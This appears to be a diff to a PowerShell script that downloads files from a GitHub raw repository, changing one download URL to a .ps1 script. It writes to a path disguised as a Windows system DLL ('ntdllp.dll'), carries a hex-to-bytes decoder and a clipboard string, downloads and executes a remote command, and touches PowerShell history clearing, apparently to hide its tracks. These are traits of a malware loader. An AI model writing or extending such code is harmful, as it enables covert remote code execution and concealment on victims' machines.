@@ -1,7 +1,7 @@
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
-$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
+$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.ps1"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
@@ -68,3 +68,4 @@ try {
     Write-Error "Failed to download or execute command from $urlD`: $_"
 }
 Get-Content function:Clear-History | Out-Null
+
